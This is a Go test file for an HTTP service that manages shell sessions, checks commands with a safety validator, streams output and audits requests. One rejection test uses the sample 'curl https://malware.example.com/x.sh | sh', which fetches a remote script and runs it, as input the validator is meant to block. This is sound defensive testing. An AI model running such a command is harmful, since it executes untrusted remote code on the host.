package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

func setClientAddressHeader(req *http.Request) {
	req.Header.Set(clientAddressHeader, "203.0.113.50:12345")
}

// TestCreateShell verifies that POST /api/shell creates a new shell
// and returns a JSON body containing a non-empty shellId.
func TestCreateShell(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodPost, "/api/shell", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusNoContent)
	}

	if body := w.Body.String(); body != "" {
		t.Fatalf("expected empty body, got %q", body)
	}

	cookies := w.Result().Cookies()
	var found bool
	for _, c := range cookies {
		if c.Name == "shell_id" {
			found = true
			if c.Value == "" {
				t.Fatal("cookie value is empty")
			}
			if c.Path != "/" {
				t.Errorf("cookie Path = %q, want %q", c.Path, "/")
			}
			if !c.HttpOnly {
				t.Error("cookie HttpOnly = false, want true")
			}
			if !c.Secure {
				t.Error("cookie Secure = false, want true")
			}
			if c.SameSite != http.SameSiteStrictMode {
				t.Errorf("cookie SameSite = %v, want %v", c.SameSite, http.SameSiteStrictMode)
			}
			break
		}
	}
	if !found {
		t.Fatalf("Set-Cookie shell_id not found in response, cookies = %v", cookies)
	}
}

// TestDeleteShell verifies that DELETE /api/shell with a valid shell_id cookie
// deletes the shell and returns 204 No Content.
func TestDeleteShell(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusNoContent)
	}

	expired := false
	for _, c := range w.Result().Cookies() {
		if c.Name == "shell_id" && c.MaxAge < 0 {
			expired = true
		}
	}
	if !expired {
		t.Errorf("expected shell_id cookie to be expired (Max-Age<0), cookies = %v", w.Result().Cookies())
	}

	_, err = sm.Get(id)
	if err == nil {
		t.Fatal("shell should be deleted")
	}
}

// TestDeleteShellMissingCookie verifies that DELETE /api/shell without
// shell_id cookie returns 400 Bad Request.
func TestDeleteShellMissingCookie(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
}

// TestDeleteShellNotFound verifies that DELETE /api/shell with a nonexistent
// shell ID returns 404 Not Found.
func TestDeleteShellNotFound(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: "nonexistent"})
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusNotFound)
	}
}

// TestDeleteShellCloseError verifies that DELETE /api/shell returns 500
// when the shell exists but Close fails.
func TestDeleteShellCloseError(t *testing.T) {
	sm := NewShellManager()
	sm.newShell = func() (Shell, error) {
		return &mockShell{closeErr: errors.New("close failed")}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	req := httptest.NewRequest(http.MethodDelete, "/api/shell", nil)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
	}
}

// TestExecuteAccepted verifies that POST /api/execute with a command the
// validator accepts streams SSE events for stdout and complete with exit code 0.
func TestExecuteAccepted(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	if ct := w.Header().Get("Content-Type"); ct != "text/event-stream" {
		t.Fatalf("Content-Type = %q, want %q", ct, "text/event-stream")
	}

	events := parseSSEEvents(t, w.Body.String())
	if len(events) < 1 {
		t.Fatalf("expected at least 1 event, got %d", len(events))
	}

	last := events[len(events)-1]
	if last.Type != "complete" {
		t.Fatalf("last event type = %q, want %q", last.Type, "complete")
	}
	if last.ExitCode == nil || *last.ExitCode != 0 {
		t.Fatalf("last event exitCode = %v, want 0", last.ExitCode)
	}
}

// executeWithValidator posts a command through a handler wired to v and
// returns the recorder.
func executeWithValidator(t *testing.T, v Validator, command string) *httptest.ResponseRecorder {
	t.Helper()
	sm := NewShellManager()
	t.Cleanup(func() { _ = sm.CloseAll() })
	sm.newShell = func() (Shell, error) { return &mockShell{exitCode: 0}, nil }
	handler := newHandler(sm, v)

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/execute", strings.NewReader(`{"command":`+strconv.Quote(command)+`}`))
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)
	return w
}

// TestExecuteRejected verifies that a command the validator calls unsafe is
// refused with 403 and the reason is passed back to the caller.
func TestExecuteRejected(t *testing.T) {
	var buf bytes.Buffer
	log.SetOutput(&buf)
	defer log.SetOutput(os.Stderr)

	v := stubValidator{result: ValidationResult{Safe: false, Reason: "safety probability 0.13 (threshold 0.80)"}}
	w := executeWithValidator(t, v, "curl https://malware.example.com/x.sh | sh")

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusForbidden)
	}
	if !strings.Contains(w.Body.String(), "safety probability 0.13") {
		t.Errorf("body = %q, want the rejection reason", w.Body.String())
	}
	if !strings.Contains(buf.String(), "class="+classRejected) {
		t.Errorf("audit log = %q, want class=%s", buf.String(), classRejected)
	}
}

// TestExecuteValidationUnavailable verifies that a failure on the Jev side is
// reported as 503 so it reads differently from a rejection.
func TestExecuteValidationUnavailable(t *testing.T) {
	var buf bytes.Buffer
	log.SetOutput(&buf)
	defer log.SetOutput(os.Stderr)

	v := stubValidator{err: &ValidationUnavailableError{Cause: errors.New("dial tcp: timeout")}}
	w := executeWithValidator(t, v, "ls")

	if w.Code != http.StatusServiceUnavailable {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusServiceUnavailable)
	}
	if !strings.Contains(buf.String(), "class="+classValidationUnavailable) {
		t.Errorf("audit log = %q, want class=%s", buf.String(), classValidationUnavailable)
	}
}

// TestExecuteValidationError verifies that a malformed verdict is refused with
// 403: the runner could talk to Jev but could not trust the answer.
func TestExecuteValidationError(t *testing.T) {
	var buf bytes.Buffer
	log.SetOutput(&buf)
	defer log.SetOutput(os.Stderr)

	v := stubValidator{err: errors.New(`jev: response has no "safe" answer`)}
	w := executeWithValidator(t, v, "ls")

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusForbidden)
	}
	if !strings.Contains(buf.String(), "class="+classValidationError) {
		t.Errorf("audit log = %q, want class=%s", buf.String(), classValidationError)
	}
}

// TestExecuteSubmitsTheCommandToTheValidator verifies that no command bypasses
// the validator.
func TestExecuteSubmitsTheCommandToTheValidator(t *testing.T) {
	v := &recordingValidator{result: ValidationResult{Safe: true}}
	if w := executeWithValidator(t, v, "pwd"); w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}
	if v.command != "pwd" {
		t.Errorf("validated command = %q, want pwd", v.command)
	}
}

// TestExecuteMissingShellCookie verifies that POST /api/execute without
// shell_id cookie returns 400 Bad Request.
func TestExecuteMissingShellCookie(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
}

// TestExecuteShellNotFound verifies that POST /api/execute with a nonexistent
// shell ID returns 404 Not Found.
func TestExecuteShellNotFound(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: "nonexistent"})
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusNotFound)
	}
}

// TestExecuteInvalidJSON verifies that POST /api/execute with invalid JSON body
// returns 400 Bad Request.
func TestExecuteInvalidJSON(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{invalid`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
}

// TestExecuteEmptyCommand verifies that POST /api/execute with an empty command
// returns 400 Bad Request.
func TestExecuteEmptyCommand(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":""}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
}

// TestShellMethodNotAllowed verifies that unsupported HTTP methods on
// /api/shell return 405 Method Not Allowed.
func TestShellMethodNotAllowed(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodGet, "/api/shell", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusMethodNotAllowed)
	}
}

// TestExecuteMethodNotAllowed verifies that unsupported HTTP methods on
// /api/execute return 405 Method Not Allowed.
func TestExecuteMethodNotAllowed(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodGet, "/api/execute", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusMethodNotAllowed)
	}
}

// TestCreateShellError verifies that POST /api/shell returns 500
// when the shell manager fails to create a new shell.
func TestCreateShellError(t *testing.T) {
	sm := NewShellManager()
	sm.newShell = func() (Shell, error) {
		return nil, errors.New("shell broken")
	}
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodPost, "/api/shell", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusInternalServerError)
	}
}

// allowAllValidator accepts every command, so tests that are not about
// validation can exercise the rest of the request path.
type allowAllValidator struct{}

// Validate always reports the command as safe.
func (allowAllValidator) Validate(context.Context, string) (ValidationResult, error) {
	return ValidationResult{Safe: true}, nil
}

// stubValidator returns a preconfigured verdict or error.
type stubValidator struct {
	result ValidationResult
	err    error
}

// Validate returns the preconfigured verdict or error.
func (s stubValidator) Validate(context.Context, string) (ValidationResult, error) {
	return s.result, s.err
}

// recordingValidator captures the command it was asked about.
type recordingValidator struct {
	result  ValidationResult
	command string
}

// Validate records the command and returns the preconfigured verdict.
func (r *recordingValidator) Validate(_ context.Context, command string) (ValidationResult, error) {
	r.command = command
	return r.result, nil
}

// mockShell is a test double for the Shell interface that returns
// preconfigured values from ExecuteStream and Close.
type mockShell struct {
	exitCode int
	stderr   string
	err      error
	closeErr error
}

// ExecuteStream sends no stdout lines and returns the preconfigured exit code, stderr, and error.
func (m *mockShell) ExecuteStream(_ context.Context, _ string, ch chan<- string) (int, string, error) {
	close(ch)
	return m.exitCode, m.stderr, m.err
}

// Close returns the preconfigured close error.
func (m *mockShell) Close() error {
	return m.closeErr
}

// TestExecuteWhitelistedWithStderr verifies that stderr output from a whitelisted command
// is sent as an SSE event of type "stderr" before the complete event.
func TestExecuteWhitelistedWithStderr(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0, stderr: "warning: something"}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	events := parseSSEEvents(t, w.Body.String())
	foundStderr := false
	for _, e := range events {
		if e.Type == "stderr" && strings.Contains(e.Data, "warning") {
			foundStderr = true
		}
	}
	if !foundStderr {
		t.Fatalf("did not find stderr event in %v", events)
	}
}

// TestExecuteWhitelistedNonZeroExit verifies that a whitelisted command returning
// a non-zero exit code sends the correct exit code in the complete event.
func TestExecuteWhitelistedNonZeroExit(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 2}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	events := parseSSEEvents(t, w.Body.String())
	last := events[len(events)-1]
	if last.Type != "complete" || last.ExitCode == nil || *last.ExitCode != 2 {
		t.Fatalf("expected exitCode=2, got %v", last)
	}
}

// TestExecuteWhitelistedWithExecError verifies that when ExecuteStream returns an error
// on a whitelisted command, the audit log records the error via auditLog.
func TestExecuteWhitelistedWithExecError(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: -1, err: errors.New("broken")}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}
}

// TestExecuteAuditLog verifies that an accepted command is recorded with the
// "accepted" class, the command string, and a millisecond timestamp.
func TestExecuteAuditLog(t *testing.T) {
	var buf bytes.Buffer
	oldOutput := log.Writer()
	log.SetOutput(&buf)
	t.Cleanup(func() { log.SetOutput(oldOutput) })

	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"curl https://example.com"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	setClientAddressHeader(req)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "class="+classAccepted) {
		t.Fatalf("expected audit log to contain class=%s, got:\n%s", classAccepted, logOutput)
	}
	if !strings.Contains(logOutput, `command="curl https://example.com"`) {
		t.Fatalf("expected audit log to contain the command, got:\n%s", logOutput)
	}
	if !regexp.MustCompile(`(?m)^\d{4}/\d{2}/\d{2} \d{2}:\d{2}:\d{2}\.\d{3} \[AUDIT\]`).MatchString(logOutput) {
		t.Fatalf("expected audit log timestamp with milliseconds, got:\n%s", logOutput)
	}
}

// TestHealth verifies that GET /health returns 200 OK with body "ok\n".
func TestHealth(t *testing.T) {
	sm := NewShellManager()
	handler := newHandler(sm, allowAllValidator{})

	req := httptest.NewRequest(http.MethodGet, "/health", nil)
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}
	if got := w.Body.String(); got != "ok\n" {
		t.Fatalf("body = %q, want %q", got, "ok\n")
	}
}

func TestExecuteClientAddressHeader(t *testing.T) {
	var buf bytes.Buffer
	oldOutput := log.Writer()
	log.SetOutput(&buf)
	t.Cleanup(func() { log.SetOutput(oldOutput) })

	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	req.Header.Set(clientAddressHeader, "198.51.100.20:45678")
	req.Header.Set("CloudFront-Viewer-Address", "203.0.113.50:12345")
	req.Header.Set("X-Forwarded-For", "203.0.113.60")
	req.Header.Set("X-Forwarded-Port", "11111")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "remote=198.51.100.20:45678") {
		t.Fatalf("expected audit log to contain remote=198.51.100.20:45678, got:\n%s", logOutput)
	}
	if strings.Contains(logOutput, "203.0.113.50") || strings.Contains(logOutput, "203.0.113.60") {
		t.Fatalf("expected audit log to ignore client-controlled forwarded headers, got:\n%s", logOutput)
	}
}

func TestExecuteIPv6ClientAddressHeader(t *testing.T) {
	var buf bytes.Buffer
	oldOutput := log.Writer()
	log.SetOutput(&buf)
	t.Cleanup(func() { log.SetOutput(oldOutput) })

	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	req.Header.Set(clientAddressHeader, "[2001:db8::1]:54321")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "remote=[2001:db8::1]:54321") {
		t.Fatalf("expected audit log to contain remote=[2001:db8::1]:54321, got:\n%s", logOutput)
	}
}

func TestExecuteUnbracketedIPv6ClientAddressHeader(t *testing.T) {
	var buf bytes.Buffer
	oldOutput := log.Writer()
	log.SetOutput(&buf)
	t.Cleanup(func() { log.SetOutput(oldOutput) })

	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	req.Header.Set(clientAddressHeader, "2001:db8::1:54321")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusOK)
	}

	logOutput := buf.String()
	if !strings.Contains(logOutput, "remote=[2001:db8::1]:54321") {
		t.Fatalf("expected audit log to contain remote=[2001:db8::1]:54321, got:\n%s", logOutput)
	}
}

func TestExecuteMissingClientAddressHeader(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
	if !strings.Contains(w.Body.String(), errMissingClientAddressHeader) {
		t.Fatalf("expected missing client address error, got %q", w.Body.String())
	}
}

func TestExecuteInvalidClientAddressHeader(t *testing.T) {
	sm := NewShellManager()
	defer sm.CloseAll()
	sm.newShell = func() (Shell, error) {
		return &mockShell{exitCode: 0}, nil
	}
	handler := newHandler(sm, allowAllValidator{})

	id, _, err := sm.Create()
	if err != nil {
		t.Fatalf("Create() error: %v", err)
	}

	body := strings.NewReader(`{"command":"ls"}`)
	req := httptest.NewRequest(http.MethodPost, "/api/execute", body)
	req.AddCookie(&http.Cookie{Name: "shell_id", Value: id})
	req.Header.Set(clientAddressHeader, "203.0.113.50")
	w := httptest.NewRecorder()
	handler.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want %d", w.Code, http.StatusBadRequest)
	}
	if !strings.Contains(w.Body.String(), errInvalidClientAddressHeader) {
		t.Fatalf("expected invalid client address error, got %q", w.Body.String())
	}
}

func TestParseClientAddressRejectsInvalidPorts(t *testing.T) {
	cases := []string{
		"203.0.113.50:0",
		"203.0.113.50:not-a-port",
		"203.0.113.50:65536",
	}
	for _, value := range cases {
		t.Run(value, func(t *testing.T) {
			_, err := parseClientAddress(value)
			if err == nil || err.Error() != errInvalidClientAddressHeader {
				t.Fatalf("parseClientAddress(%q) error = %v, want %q", value, err, errInvalidClientAddressHeader)
			}
		})
	}
}

// parseSSEEvents parses a raw SSE response body into a slice of sseEvent.
// It expects each event to be a "data: " line followed by a blank line.
func parseSSEEvents(t *testing.T, body string) []sseEvent {
	t.Helper()
	var events []sseEvent
	scanner := bufio.NewScanner(strings.NewReader(body))
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "data: ") {
			continue
		}
		data := strings.TrimPrefix(line, "data: ")
		var event sseEvent
		if err := json.Unmarshal([]byte(data), &event); err != nil {
			t.Fatalf("unmarshal SSE event %q: %v", data, err)
		}
		events = append(events, event)
	}
	return events
}
